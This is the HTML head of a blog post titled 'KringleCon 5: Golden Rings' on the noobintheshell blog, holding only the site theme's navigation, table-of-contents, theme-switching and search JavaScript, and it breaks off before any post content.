<!DOCTYPE html>
<html lang="en" dir="ltr">

<head prefix="og: http://ogp.me/ns#">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>KringleCon 5: Golden Rings – noobintheshell :: blog</title>
    




<script src="/js/enquire.min.dfb99dee1e029d51d6cfb672d847929890b1585402de17f5ed092edd72a688b4.js"></script>

<script defer src="/js/lazysizes.min.fb649fcae62177dfe63e67081ddceb830b5ce1f05a4184e9bbb7d87ac4b8f4e5.js"></script>

<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>

<script defer src="/js/helper/fadeinout.min.efa35f4c090622130b3f4cfae6971448b5ffb61c5f0a8f21cdfd157fa712abc4.js"></script>

<script defer src="/js/helper/closest.min.js"></script>
  
<script>
  "use strict";

  
  
  if (window.NodeList && !NodeList.prototype.forEach) {
    NodeList.prototype.forEach = Array.prototype.forEach;
  }

  
  if (!String.prototype.includes) {
    String.prototype.includes = function (search, start) {
      'use strict';

      if (search instanceof RegExp) {
        throw TypeError('first argument must not be a RegExp');
      }
      if (start === undefined) { start = 0; }
      return this.indexOf(search, start) !== -1;
    };
  }

  
  Document.prototype.append = Element.prototype.append = function append() {
    this.appendChild(_mutation(arguments));
  };
  function _mutation(nodes) {
    if (!nodes.length) {
      throw new Error('DOM Exception 8');
    } else if (nodes.length === 1) {
      return typeof nodes[0] === 'string' ? document.createTextNode(nodes[0]) : nodes[0];
    } else {
      var
      fragment = document.createDocumentFragment(),
      length = nodes.length,
      index = -1,
      node;

      while (++index < length) {
        node = nodes[index];

        fragment.appendChild(typeof node === 'string' ? document.createTextNode(node) : node);
      }

      return fragment;
    }
  }

  
  if (!String.prototype.startsWith) {
    String.prototype.startsWith = function (searchString, position) {
      position = position || 0;
      return this.indexOf(searchString, position) === position;
    };
  }
  


  document.addEventListener('DOMContentLoaded', function () {
    
    var navCollapseBtn = document.querySelector('.navbar__burger');
    navCollapseBtn ? navCollapseBtn.addEventListener('click', function (e) {
      var navCollapse = document.querySelector('.navbarm__collapse');

      if (navCollapse) {
        var dataOpen = navCollapse.getAttribute('data-open');

        if (dataOpen === 'true') {
          navCollapse.setAttribute('data-open', 'false');
          navCollapse.style.maxHeight = 0;
          navCollapseBtn.classList.remove('is-active');
        } else {
          navCollapse.setAttribute('data-open', 'true');
          navCollapse.style.maxHeight = navCollapse.scrollHeight + "px";
          navCollapseBtn.classList.add('is-active');
        }
      }
    }) : null;
    


    
    var tables = document.querySelectorAll('.single__contents > table');
    for (let i = 0; i < tables.length; i++) {
      var table = tables[i];
      var wrapper = document.createElement('div');
      wrapper.className = 'table-wrapper';
      table.parentElement.replaceChild(wrapper, table);
      wrapper.appendChild(table);
    }
    


    
    var footNoteRefs = document.querySelectorAll('.footnote-ref');
    var footNoteBackRefs = document.querySelectorAll('.footnote-backref');

    footNoteRefs ? 
    footNoteRefs.forEach(function(elem, idx) {
      elem.onmouseenter = function () {
        if (navbar.classList.contains('scrolling')) {
          navbar.classList.remove('scrolling');
        }
      }

      elem.onmouseleave = function () {
        if (!navbar.classList.contains('scrolling')) {
          setTimeout(function () {
            navbar.classList.add('scrolling');
          }, 100);
        }
      }

      elem.onclick = function () {
        if (!navbar.classList.contains('scrolling')) {
          navbar.classList.remove('navbar--show');
          navbar.classList.remove('navbar--hide');
          navbar.classList.add('navbar--hide');
        }
      }
    }) : null;

    footNoteBackRefs ? 
    footNoteBackRefs.forEach(function(elem, idx) {
      elem.onmouseenter = function () {
        if (navbar.classList.contains('scrolling')) {
          navbar.classList.remove('scrolling');
        }
      }

      elem.onmouseleave = function () {
        if (!navbar.classList.contains('scrolling')) {
          setTimeout(function() {
            navbar.classList.add('scrolling');
          }, 100);
        }
      }

      elem.onclick = function () {
        if (!navbar.classList.contains('scrolling')) {
          navbar.classList.remove('navbar--show');
          navbar.classList.remove('navbar--hide');
          navbar.classList.add('navbar--hide');
        }
      }
    }) : null;
    


    
    var summaryContainer = document.querySelector('.summary__container');
    var searchResult = document.querySelector('.search-result');
    var searchResultCloseBtn = document.querySelector('.search-result__close');
    searchResultCloseBtn ? searchResultCloseBtn.addEventListener('click', function (e) {
      searchResult.setAttribute('data-display', 'none');
      summaryContainer.setAttribute('data-display', 'block');
    }) : null;
    


    
    document.querySelectorAll('.tab') ? 
    document.querySelectorAll('.tab').forEach(function(elem, idx) {
      var containerId = elem.getAttribute('id');
      var containerElem = elem;
      var tabLinks = elem.querySelectorAll('.tab__link');
      var tabContents = elem.querySelectorAll('.tab__content');
      var ids = [];

      tabLinks && tabLinks.length > 0 ?
      tabLinks.forEach(function(link, index, self) {
        link.onclick = function(e) {
          for (var i = 0; i < self.length; i++) {
            if (index === parseInt(i, 10)) {
              if (!self[i].classList.contains('active')) {
                self[i].classList.add('active');
                tabContents[i].style.display = 'block';
              }
            } else {
              self[i].classList.remove('active');
              tabContents[i].style.display = 'none';
            }
          }
        }
      }) : null;
    }) : null;
    


    
    document.querySelectorAll('.codetab') ? 
    document.querySelectorAll('.codetab').forEach(function(elem, idx) {
      var containerId = elem.getAttribute('id');
      var containerElem = elem;
      var codetabLinks = elem.querySelectorAll('.codetab__link');
      var codetabContents = elem.querySelectorAll('.codetab__content');
      var ids = [];

      codetabLinks && codetabLinks.length > 0 ?
      codetabLinks.forEach(function(link, index, self) {
        link.onclick = function(e) {
          for (var i = 0; i < self.length; i++) {
            if (index === parseInt(i, 10)) {
              if (!self[i].classList.contains('active')) {
                self[i].classList.add('active');
                codetabContents[i].style.display = 'block';
              }
            } else {
              self[i].classList.remove('active');
              codetabContents[i].style.display = 'none';
            }
          }
        }
      }) : null;
    }) : null;
    


    
    var gttBtn = document.getElementById("gtt");
    gttBtn.style.display = "none";
    gttBtn.addEventListener('click', function () {
      if (window.document.documentMode) {
        document.documentElement.scrollTop = 0;
      } else {
        scrollToTop(250);
      }
    });

    function scrollToTop(scrollDuration) {
      var scrollStep = -window.scrollY / (scrollDuration / 15);
      var scrollInterval = setInterval(function () {
        if (window.scrollY != 0) {
          window.scrollBy(0, scrollStep);
        }
        else clearInterval(scrollInterval);
      }, 15);
    }

    var scrollFunction = function () {
      if (document.body.scrollTop > 250 || document.documentElement.scrollTop > 250) {
        gttBtn.style.display = "block";
      } else {
        gttBtn.style.display = "none";
      }
    }
    


    
    var expandBtn = document.querySelectorAll('.expand__button');

    for (let i = 0; i < expandBtn.length; i++) {
      expandBtn[i].addEventListener("click", function () {
        var content = this.nextElementSibling;
        if (content.style.maxHeight) {
          content.style.maxHeight = null;
          this.querySelector('svg').classList.add('expand-icon__right');
          this.querySelector('svg').classList.remove('expand-icon__down');
        } else {
          content.style.maxHeight = content.scrollHeight + "px";
          this.querySelector('svg').classList.remove('expand-icon__right');
          this.querySelector('svg').classList.add('expand-icon__down');
        }
      });
    }
    


    
    var lastScrollTop = window.pageYOffset || document.documentElement.scrollTop;
    var tocElem = document.querySelector('.toc');
    var tableOfContentsElem = tocElem ? tocElem.querySelector('#TableOfContents') : null;
    var toggleTocElem = document.getElementById('toggle-toc');
    var singleContentsElem = document.querySelector('.single__contents');
    var navbar = document.querySelector('.navbar');
    var tocFlexbox = document.querySelector('.toc__flexbox');
    var tocFlexboxOuter = document.querySelector('.toc__flexbox--outer');
    var expandContents = document.querySelectorAll('.expand__content');
    var boxContents = document.querySelectorAll('.box');
    var notAllowedTitleIds = null;

    
    var tocFolding = JSON.parse("true");
    
    var tocLevels = JSON.parse("[\"h2\",\"h3\",\"h4\"]");
    
    if (tocLevels) {
      tocLevels = tocLevels.toString();
    } else {
      tocLevels = "h1, h2, h3, h4, h5, h6";
    }

    
    singleContentsElem && singleContentsElem.querySelectorAll(".tab") ?
    singleContentsElem.querySelectorAll(".tab").forEach(function (elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    expandContents ? expandContents.forEach(function(elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    boxContents ? boxContents.forEach(function(elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    window.onscroll = function () {
      scrollFunction();
      
      var st = window.pageYOffset || document.documentElement.scrollTop;
      if (st > lastScrollTop) { 
        if (st < 250) {
          gttBtn.style.display = "none";
        } else {
          gttBtn.style.display = "block";
        }

        if (st < 45) {
          return null;
        }

        if (navbar.classList.contains('scrolling')) {
          if (!navbar.classList.contains('navbar--hide')) {
            navbar.classList.add('navbar--hide');
          } else if (navbar.classList.contains('navbar--show')) {
            navbar.classList.remove('navbar--show');
          }
        }

        if (singleContentsElem) {
          if (singleContentsElem.querySelectorAll(tocLevels).length > 0) {
            singleContentsElem.querySelectorAll(tocLevels).forEach(function (elem) {
              if (toggleTocElem && !toggleTocElem.checked) {
                return null;
              }

              if (notAllowedTitleIds && notAllowedTitleIds.includes(elem.getAttribute('id'))) {
                return null;
              }
              
              if (document.documentElement.scrollTop >= elem.offsetTop) {
                if (tableOfContentsElem) {
                  var id = elem.getAttribute('id');
                  tocElem.querySelectorAll('a').forEach(function (elem) {
                    elem.classList.remove('active');
                  });
                  tocElem.querySelector('a[href="#' + id + '"]') ?
                    tocElem.querySelector('a[href="#' + id + '"]').classList.add('active') : null;

                  if (false === tocFolding) {
                    
                  } else {
                    tableOfContentsElem.querySelectorAll('ul') ?
                      tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
                        rootUl.querySelectorAll('li').forEach(function (liElem) {
                          liElem.querySelectorAll('ul').forEach(function (ulElem) {
                            ulElem.style.display = 'none';
                          });
                        });
                      }) : null;
                  }

                  var curElem = tableOfContentsElem.querySelector("[href='#" + id + "']");
                  if (curElem && curElem.nextElementSibling) {
                    curElem.nextElementSibling.style.display = 'block';
                  }
                  getParents(curElem, 'ul') ?
                    getParents(curElem, 'ul').forEach(function (elem) {
                      elem.style.display = 'block';
                    }) : null;
                }
              }
            });
          } else {
            if (tocFlexbox) {
              tocFlexbox.setAttribute('data-position', '');
              if (!tocFlexbox.classList.contains('hide')) {
                tocFlexbox.classList.add('hide');
              }
            }
            if (tocFlexboxOuter) {
              tocFlexboxOuter.setAttribute('data-position', '');
              if (!tocFlexboxOuter.classList.contains('hide')) {
                tocFlexboxOuter.classList.add('hide');
              }
            }
          }
        }
      } else { 
        if (st < 250) {
          gttBtn.style.display = "none";
        }

        if (navbar.classList.contains('scrolling')) {
          if (navbar.classList.contains('navbar--hide')) {
            navbar.classList.remove('navbar--hide');
          } else if (!navbar.classList.contains('navbar--show')) {
            navbar.classList.add('navbar--show');
          }
        }

        if (singleContentsElem) {
          if (singleContentsElem.querySelectorAll(tocLevels).length > 0) {
            singleContentsElem.querySelectorAll(tocLevels).forEach(function (elem) {
              if (toggleTocElem && !toggleTocElem.checked) {
                return null;
              }
              
              if (notAllowedTitleIds && notAllowedTitleIds.includes(elem.getAttribute('id'))) {
                return null;
              }

              if (document.documentElement.scrollTop >= elem.offsetTop) {
                if (tableOfContentsElem) {
                  var id = elem.getAttribute('id');
                  tocElem.querySelectorAll('a').forEach(function (elem) {
                    elem.classList.remove('active');
                  });
                  tocElem.querySelector('a[href="#' + id + '"]') ?
                    tocElem.querySelector('a[href="#' + id + '"]').classList.add('active') : null;

                  if (false === tocFolding) {
                    
                  } else {
                    tableOfContentsElem.querySelectorAll('ul') ?
                      tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
                        rootUl.querySelectorAll('li').forEach(function (liElem) {
                          liElem.querySelectorAll('ul').forEach(function (ulElem) {
                            ulElem.style.display = 'none';
                          });
                        });
                      }) : null;
                  }

                  var curElem = tableOfContentsElem.querySelector("[href='#" + id + "']");
                  if (curElem && curElem.nextElementSibling) {
                    curElem.nextElementSibling.style.display = 'block';
                  }
                  getParents(curElem, 'ul') ?
                    getParents(curElem, 'ul').forEach(function (elem) {
                      elem.style.display = 'block';
                    }) : null;
                }
              }
            });
          } else {
            if (tocFlexbox && !tocFlexbox.classList.contains('hide')) {
              tocFlexbox.classList.add('hide');
            }
            if (tocFlexboxOuter && !tocFlexboxOuter.classList.contains('hide')) {
              tocFlexboxOuter.classList.add('hide');
            }
          }
          
        }

        if (tableOfContentsElem && document.documentElement.scrollTop < 250) {
          if (false === tocFolding) {

          } else {
            tableOfContentsElem.querySelector('ul') ?
              tableOfContentsElem.querySelector('ul').querySelectorAll('li').forEach(function (liElem) {
                liElem.querySelectorAll('ul').forEach(function (ulElem) {
                  ulElem.style.display = 'none';
                });
              }) : null;
          }
        }
      }
      lastScrollTop = st <= 0 ? 0 : st;
    };
  


  
    var localTheme = localStorage.getItem('theme');
    var rootEleme = document.getElementById('root');
    var selectThemeElem = document.querySelectorAll('.select-theme');
    var selectThemeItemElem = document.querySelectorAll('.select-theme__item');
    
    
    var skinDarkCode = JSON.parse("\"dark\"");
    
    var skinLightCode = JSON.parse("\"light\"");
    
    var skinHackerCode = JSON.parse("\"hacker\"");
    
    var skinSolarizedCode = JSON.parse("\"solarized\"");
    
    var skinKimbieCode = JSON.parse("\"kimbie\"");

    var setMetaColor = function(themeColor) {
      var metaMsapplicationTileColor = document.getElementsByName('msapplication-TileColor')[0];
      var metaThemeColor = document.getElementsByName('theme-color')[0];
      var metaMsapplicationNavbuttonColor = document.getElementsByName('msapplication-navbutton-color')[0];
      var metaAppleMobileWebAappStatusBarStyle = document.getElementsByName('apple-mobile-web-app-status-bar-style')[0];

      if (themeColor.includes('dark')) {
        metaMsapplicationTileColor.setAttribute('content', '#fcfcfa');
        metaThemeColor.setAttribute('content', '#403E41');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#403E41');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#403E41');
      } else if (themeColor.includes('light')) {
        metaMsapplicationTileColor.setAttribute('content', '#555');
        metaThemeColor.setAttribute('content', '#eee');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#eee');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#eee');
      } else if (themeColor.includes('hacker')) {
        metaMsapplicationTileColor.setAttribute('content', '#e3cd26');
        metaThemeColor.setAttribute('content', '#252526');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#252526');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#252526');
      } else if (themeColor.includes('solarized')) {
        metaMsapplicationTileColor.setAttribute('content', '#d3af86');
        metaThemeColor.setAttribute('content', '#51412c');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#51412c');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#51412c');
      } else if (themeColor.includes('kimbie')) {
        metaMsapplicationTileColor.setAttribute('content', '#586e75');
        metaThemeColor.setAttribute('content', '#eee8d5');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#eee8d5');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#eee8d5');
      }
    }

    var parseSkinCode = function(themeText) {
      if (themeText === skinDarkCode) {
        return 'dark';
      } else if (themeText === skinLightCode) {
        return 'light';
      } else if (themeText === skinHackerCode) {
        return 'hacker';
      } else if (themeText === skinSolarizedCode) {
        return 'solarized';
      } else if (themeText === skinKimbieCode) {
        return 'kimbie';
      }
    }
    
    if (localTheme) {
      selectThemeItemElem ? 
      selectThemeItemElem.forEach(function (elem) {
        if (elem.text.trim() === localTheme) {
          elem.classList.add('is-active');
        } else {
          elem.classList.remove('is-active');
        }
      }) : null;

      setMetaColor(localTheme);
    } else {
      setMetaColor(rootEleme.className);
    }

    selectThemeItemElem ? 
    selectThemeItemElem.forEach(function (v, i) {
      v.addEventListener('click', function (e) {
        var selectedThemeVariant = parseSkinCode(e.target.text.trim());
        localStorage.setItem('theme', selectedThemeVariant);
        setMetaColor(selectedThemeVariant);

        rootEleme.removeAttribute('class');
        rootEleme.classList.add('theme__' + selectedThemeVariant);
        selectThemeElem.forEach(function(rootElem) {
          rootElem.querySelectorAll('a').forEach(function (elem) {
            if (elem.classList) {
              if (elem.text.trim() === selectedThemeVariant) {
                if (!elem.classList.contains('is-active')) {
                  elem.classList.add('is-active');
                }
              } else {
                if (elem.classList.contains('is-active')) {
                  elem.classList.remove('is-active');
                }
              }
            }
          });
        });

        if (window.mermaid) {
          if (selectedThemeVariant === "dark" || selectedThemeVariant === "hacker") {
            mermaid.initialize({ theme: 'dark' });
            location.reload();
          } else {
            mermaid.initialize({ theme: 'default' });
            location.reload();
          }
        }

        var utterances = document.getElementById('utterances');
        if (utterances) {
          utterances.querySelector('iframe').contentWindow.postMessage({
            type: 'set-theme',
            theme: selectedThemeVariant === "dark" || selectedThemeVariant === "hacker" ? 'photon-dark' : selectedThemeVariant === 'kimbie' ? 'github-dark-orange' : 'github-light',
          }, 'https://utteranc.es');
        }

        var twitterCards = document.querySelectorAll('.twitter-timeline');
        if (twitterCards) {
          window.postMessage({
            type: 'set-twitter-theme',
            theme: selectedThemeVariant === 'light' || selectedThemeVariant === 'solarized' ? 'light' : 'dark',
          });
        }
      });
    }) : null;
  


  
    
    var baseurl = JSON.parse("\"https://noobintheshell.com\"");
    
    var permalink = JSON.parse("\"https://noobintheshell.com/posts/kringlecon5/\"");
    
    var langprefix = JSON.parse("\"\"");
    var searchResults = null;
    var searchMenu = null;
    var searchText = null;
    
    
    var enableSearch = JSON.parse("false");
    
    var enableSearchHighlight = JSON.parse("false");
    
    var searchResultPosition = JSON.parse("\"main\"");
    
    var sectionType = JSON.parse("\"posts\"");
    
    var kind = JSON.parse("\"page\"");
    
    var fuse = null;

    if (enableSearch) {
      (function initFuse() {
        var xhr = new XMLHttpRequest();
        if (sectionType === "publication" && kind !== "page") {
          xhr.open('GET', permalink + "index.json");
        } else {
          xhr.open('GET', baseurl + langprefix + "/index.json");
        }
        
        xhr.setRequestHeader('Content-Type', 'application/json; charset=utf-8');
        xhr.onload = function () {
          if (xhr.status === 200) {
            fuse = new Fuse(JSON.parse(xhr.response.toString('utf-8')), {
              keys: sectionType.includes('publication') ? ['title', 'abstract'] : ['title', 'description', 'content'],
              includeMatches: enableSearchHighlight,
              shouldSort: true, 
              threshold: 0.4, 
              location: 0, 
              distance: 100, 
              maxPatternLength: 32,
              minMatchCharLength: 1,
              isCaseSensitive: false, 
              findAllMatches: false, 
              useExtendedSearch: false, 
            });
            window.fuse = fuse;
          }
          else {
            console.error('[' + xhr.status + ']Error:', xhr.statusText);
          }
        };
        xhr.send();
      })();
    }

    function makeLi(ulElem, obj) {
      var li = document.createElement('li');
      li.className = 'search-result__item';
      
      var a = document.createElement('a');
      a.innerHTML = obj.item.title;
      a.setAttribute('class', 'search-result__item--title');
      a.setAttribute('href', obj.item.permalink);

      var descDiv = document.createElement('div');
      descDiv.setAttribute('class', 'search-result__item--desc');
      if (obj.item.description) {
        descDiv.innerHTML = obj.item.description;
      } else if (obj.item.content) {
        descDiv.innerHTML = obj.item.content.substring(0, 225);
      }
      
      li.appendChild(a);
      li.appendChild(descDiv);
      ulElem.appendChild(li);
    }

    function makeHighlightLi(ulElem, obj) {
      var li = document.createElement('li');
      li.className = 'search-result__item';
      var descDiv = null;

      var a = document.createElement('a');
      a.innerHTML = obj.item.title;
      a.setAttribute('class', 'search-result__item--title');
      a.setAttribute('href', obj.item.uri);

      if (obj.matches && obj.matches.length) {
        for (var i = 0; i < obj.matches.length; i++) {
          if ('title' === obj.matches[i].key) {
            a = document.createElement('a');
            a.innerHTML = generateHighlightedText(obj.matches[i].value, obj.matches[i].indices);
            a.setAttribute('class', 'search-result__item--title');
            a.setAttribute('href', obj.item.uri);
          }
          
          if ('description' === obj.matches[i].key) {
            descDiv = document.createElement('div');
            descDiv.setAttribute('class', 'search-result__item--desc');
            descDiv.innerHTML = generateHighlightedText(obj.item.description, obj.matches[i].indices);
          } else if ('content' === obj.matches[i].key) {
            if (!descDiv) {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = generateHighlightedText(obj.item.content.substring(0, 150), obj.matches[i].indices);
            }
          } else {
            if (obj.item.description) {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = obj.item.description;
            } else {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = obj.item.content.substring(0, 150);
            }
          }
        }

        li.appendChild(a);
        if (descDiv) {
          li.appendChild(descDiv);
        }
        if (li) {
          ulElem.appendChild(li);
        }
      }
    }

    function renderSearchResultsSide(searchText, results) {
      searchResults = document.getElementById('search-results');
      searchMenu = document.getElementById('search-menu');
      searchResults.setAttribute('class', 'dropdown is-active');
      
      var ul = document.createElement('ul');
      ul.setAttribute('class', 'dropdown-content search-content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          a.setAttribute('href', result.uri);
          a.setAttribute('class', 'dropdown-item');
          a.appendChild(li);

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.title;
          titleDiv.setAttribute('class', 'menu-item__title');

          var descDiv = document.createElement('div');
          descDiv.setAttribute('class', 'menu-item__desc');
          if (result.description) {
            descDiv.innerHTML = result.description;
          } else if (result.content) {
            descDiv.innerHTML = result.content.substring(0, 150);
          }

          li.appendChild(titleDiv);
          li.appendChild(descDiv);
          ul.appendChild(a);
        });
      } else {
        var li = document.createElement('li');
        li.setAttribute('class', 'dropdown-item');
        li.innerText = 'No results found';
        ul.appendChild(li);
      }

      while (searchMenu.hasChildNodes()) {
        searchMenu.removeChild(
          searchMenu.lastChild
        );
      }
      
      searchMenu.appendChild(ul);
    }

    function renderSearchHighlightResultsSide(searchText, results) {
      searchResults = document.getElementById('search-results');
      searchMenu = document.getElementById('search-menu');
      searchResults.setAttribute('class', 'dropdown is-active');

      var ul = document.createElement('ul');
      ul.setAttribute('class', 'dropdown-content search-content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          var descDiv = null;

          a.setAttribute('href', result.item.uri);
          a.setAttribute('class', 'dropdown-item');
          a.appendChild(li);

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.item.title;
          titleDiv.setAttribute('class', 'menu-item__title');
          
          if (result.matches && result.matches.length) {
            for (var i = 0; i < result.matches.length; i++) {
              if ('title' === result.matches[i].key) {
                titleDiv.innerHTML = generateHighlightedText(result.matches[i].value, result.matches[i].indices);
              }

              if ('description' === result.matches[i].key) {
                descDiv = document.createElement('div');
                descDiv.setAttribute('class', 'menu-item__desc');
                descDiv.innerHTML = generateHighlightedText(result.item.description, result.matches[i].indices);
              } else if ('content' === result.matches[i].key) {
                if (!descDiv) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = generateHighlightedText(result.item.content.substring(0, 150), result.matches[i].indices);
                }
              } else {
                if (result.item.description) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = result.item.description;
                } else {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = result.item.content.substring(0, 150);
                }
              }
            }
            
            li.appendChild(titleDiv);
            if (descDiv) {
              li.appendChild(descDiv);
            }
            ul.appendChild(a);
          }
        });
      } else {
        var li = document.createElement('li');
        li.setAttribute('class', 'dropdown-item');
        li.innerText = 'No results found';
        ul.appendChild(li);
      }

      while (searchMenu.hasChildNodes()) {
        searchMenu.removeChild(
          searchMenu.lastChild
        );
      }
      searchMenu.appendChild(ul);
    }

    function renderSearchResultsMobile(searchText, results) {
      searchResults = document.getElementById('search-mobile-results');

      var content = document.createElement('div');
      content.setAttribute('class', 'mobile-search__content');

      if (results.length > 0) {
        results.forEach(function (result) {
          var item = document.createElement('a');
          item.setAttribute('href', result.uri);
          item.innerHTML = '<div class="mobile-search__item"><div class="mobile-search__item--title">📄 ' + result.title + '</div><div class="mobile-search__item--desc">' + (result.description ? result.description : result.content) + '</div></div>';
          content.appendChild(item);
        });
      } else {
        var item = document.createElement('span');
        content.appendChild(item);
      }

      let wrap = document.getElementById('search-mobile-results');
      while (wrap.firstChild) {
        wrap.removeChild(wrap.firstChild)
      }
      searchResults.appendChild(content);      
    }

    function renderSearchHighlightResultsMobile(searchText, results) {
      searchResults = document.getElementById('search-mobile-results');

      var ul = document.createElement('div');
      ul.setAttribute('class', 'mobile-search__content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          var descDiv = null;

          a.setAttribute('href', result.item.uri);
          a.appendChild(li);
          li.setAttribute('class', 'mobile-search__item');

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.item.title;
          titleDiv.setAttribute('class', 'mobile-search__item--title');
          
          if (result.matches && result.matches.length) {
            for (var i = 0; i < result.matches.length; i++) {
              if ('title' === result.matches[i].key) {
                titleDiv.innerHTML = generateHighlightedText(result.matches[i].value, result.matches[i].indices);
              }

              if ('description' === result.matches[i].key) {
                descDiv = document.createElement('div');
                descDiv.setAttribute('class', 'mobile-search__item--desc');
                descDiv.innerHTML = generateHighlightedText(result.item.description, result.matches[i].indices);
              } else if ('content' === result.matches[i].key) {
                if (!descDiv) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = generateHighlightedText(result.item.content.substring(0, 150), result.matches[i].indices);
                }
              } else {
                if (result.item.description) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = result.item.description;
                } else {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = result.item.content.substring(0, 150);
                }
              }
            }
            
            li.appendChild(titleDiv);
            if (descDiv) {
              li.appendChild(descDiv);
            }
            ul.appendChild(a);
          }
        });
      } else {
        var item = document.createElement('span');
        ul.appendChild(item);
      }

      let wrap = document.getElementById('search-mobile-results');
      while (wrap.firstChild) {
        wrap.removeChild(wrap.firstChild)
      }
      searchResults.appendChild(ul);
    }

    function generateHighlightedText(text, regions) {
      if (!regions) {
        return text;
      }

      var content = '', nextUnhighlightedRegionStartingIndex = 0;

      regions.forEach(function(region) {
        if (region[0] === region[1]) {
          return null;
        }
        
        content += '' +
          text.substring(nextUnhighlightedRegionStartingIndex, region[0]) +
          '<span class="search__highlight">' +
            text.substring(region[0], region[1] + 1) +
          '</span>' +
        '';
        nextUnhighlightedRegionStartingIndex = region[1] + 1;
      });

      content += text.substring(nextUnhighlightedRegionStartingIndex);

      return content;
    };

    var searchElem = document.getElementById('search');
    var searchMobile = document.getElementById('search-mobile');
    var searchResultsContainer = document.getElementById('search-results');

    searchElem ?
    searchElem.addEventListener('input', function(e) {
      if (!e.target.value | window.innerWidth < 770) {
        searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);
      
      if (searchResultPosition === "main") {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsMain(searchText, results);
        } else {
          renderSearchResultsMain(searchText, results);
        }
      } else {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsSide(searchText, results);
        } else {
          renderSearchResultsSide(searchText, results);
        }
        
        var dropdownItems = searchResultsContainer.querySelectorAll('.dropdown-item');
        dropdownItems ? dropdownItems.forEach(function(item) {
          item.addEventListener('mousedown', function(e) {
            e.target.click();
          });
        }) : null;
      }
    }) : null;

    searchElem ? 
    searchElem.addEventListener('blur', function() {
      if (window.innerWidth < 770) {
        return null;
      }
      searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
    }) : null;

    searchElem ? 
    searchElem.addEventListener('click', function(e) {
      if (window.innerWidth < 770) {
        return null;
      }
      if (!e.target.value) {
        searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);

      if (searchResultPosition === "main") {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsMain(searchText, results);
        } else {
          renderSearchResultsMain(searchText, results);
        }
      } else{
        if (enableSearchHighlight) {
          renderSearchHighlightResultsSide(searchText, results);
        } else {
          renderSearchResultsSide(searchText, results);
        }

        var dropdownItems = searchResultsContainer.querySelectorAll('.dropdown-item');
        dropdownItems ? dropdownItems.forEach(function (item) {
          item.addEventListener('mousedown', function (e) {
            e.target.click();
          });
        }) : null;
      }
    }) : null;

    var searchMenuElem = document.getElementById("search-menu");
    var activeItem = document.querySelector('#search-menu .dropdown-item.is-active');
    var activeIndex = null;
    var items = null;
    var searchContainerMaxHeight = 350;

    searchElem ? 
    searchElem.addEventListener('keydown', function(e) {
      if (window.innerWidth < 770) {
        return null;
      }

      if (e.key === 'Escape') {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      }

      var items = document.querySelectorAll('#search-menu .dropdown-item');
      var keyCode = e.which || e.keyCode;

      if (!items || !items.length) {
        return null;
      }
      
